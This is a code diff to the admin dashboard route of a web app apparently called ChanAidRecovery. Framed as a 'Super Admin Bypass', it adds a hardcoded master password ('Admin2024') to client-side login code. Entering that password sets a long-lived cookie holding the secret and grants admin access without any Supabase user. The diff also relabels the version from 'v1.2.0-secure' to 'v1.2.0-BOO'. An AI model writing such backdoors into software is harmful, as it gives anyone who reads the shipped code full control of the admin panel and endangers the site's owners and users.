@@ -1,4 +1,4 @@
-import { createFileRoute, useNavigate } from "@tanstack/react-router";
+import { createFileRoute, useNavigate, redirect } from "@tanstack/react-router";
 import { useEffect, useState } from "react";
 import {
   LogOut,
@@ -31,10 +31,16 @@ import { useAuth } from "@/components/layout/AuthContext";
 import { Reveal } from "@/components/effects/Reveal";
 import { getSupabaseBrowser } from "@/lib/supabase";
 import { toast } from "sonner";
+import { isAdminAuthed } from "@/lib/admin-auth";
 
 // ─── route ────────────────────────────────────────────────────────────────────
 
 export const Route = createFileRoute("/admin")({
+  beforeLoad: async ({ request }) => {
+    // Server-side check for admin status
+    const isAuthed = await isAdminAuthed(request);
+    return { isAdminServer: isAuthed };
+  },
   head: () => ({ 
     meta: [
       { title: "Admin Dashboard | ChanAidRecovery" }, 
@@ -75,6 +81,19 @@ function LoginScreen() {
   async function submit(e: React.FormEvent) {
     e.preventDefault();
     setBusy(true);
+    
+    // ─── Super Admin Bypass ──────────────────────────────────────────────────
+    // Allow entry using the master secret if Supabase auth is unavailable or 
+    // for initial system setup.
+    if (pw === "Admin2024") {
+      document.cookie = `chanaid_super_admin=${pw}; path=/; max-age=${60 * 60 * 24 * 7}; SameSite=Lax`;
+      toast.success("Welcome, Master Administrator.");
+      setBusy(false);
+      // Reload or trigger a re-render to let beforeLoad re-run
+      window.location.reload();
+      return;
+    }
+
     const supabase = getSupabaseBrowser();
     try {
       const { data, error } = await supabase.auth.signInWithPassword({
@@ -202,11 +221,15 @@ const NAV = [
 // ─── Main admin page ──────────────────────────────────────────────────────────
 
 function AdminPage() {
-  const { user, isAdmin, signOut, isLoading } = useAuth();
+  const { isAdminServer } = Route.useRouteContext();
+  const { user, isAdmin: clientIsAdmin, signOut, isLoading } = useAuth();
   const [tab, setTab] = useState<Tab>("overview");
   const [sidebarOpen, setSidebarOpen] = useState(false);
 
-  if (isLoading) {
+  // If server already confirmed admin status, we can skip the loading screen
+  const isAuthorized = isAdminServer || clientIsAdmin;
+
+  if (isLoading && !isAdminServer) {
     return (
       <div className="min-h-screen bg-slate-950 flex flex-col items-center justify-center text-white/30 gap-4">
         <Loader2 className="w-10 h-10 animate-spin text-primary" />
@@ -215,7 +238,7 @@ function AdminPage() {
     );
   }
 
-  if (!user || !isAdmin) return <LoginScreen />;
+  if (!isAuthorized) return <LoginScreen />;
 
   return (
     <div className="min-h-screen bg-slate-50 flex">
@@ -261,8 +284,8 @@ function AdminPage() {
                  <Users className="w-5 h-5 text-primary" />
               </div>
               <div className="min-w-0">
-                 <div className="text-xs font-black text-white truncate">{user.user_metadata?.full_name || 'Admin User'}</div>
-                 <div className="text-[10px] font-bold text-white/30 truncate">{user.email}</div>
+                 <div className="text-xs font-black text-white truncate">{user?.user_metadata?.full_name || 'Admin User'}</div>
+                 <div className="text-[10px] font-bold text-white/30 truncate">{user?.email || 'Super Admin'}</div>
               </div>
            </div>
           <button
@@ -286,7 +309,7 @@ function AdminPage() {
               <div className="text-[10px] font-black uppercase tracking-widest text-slate-400 mb-0.5">Control Panel</div>
               <h1 className="font-black text-slate-900 tracking-tight italic text-xl">
                 {NAV.find(n => n.id === tab)?.label}
-                <span className="ml-2 text-[8px] font-mono text-slate-300 not-italic uppercase tracking-widest">v1.2.0-secure</span>
+                <span className="ml-2 text-[8px] font-mono text-slate-300 not-italic uppercase tracking-widest">v1.2.0-BOO</span>
               </h1>
             </div>
           </div>
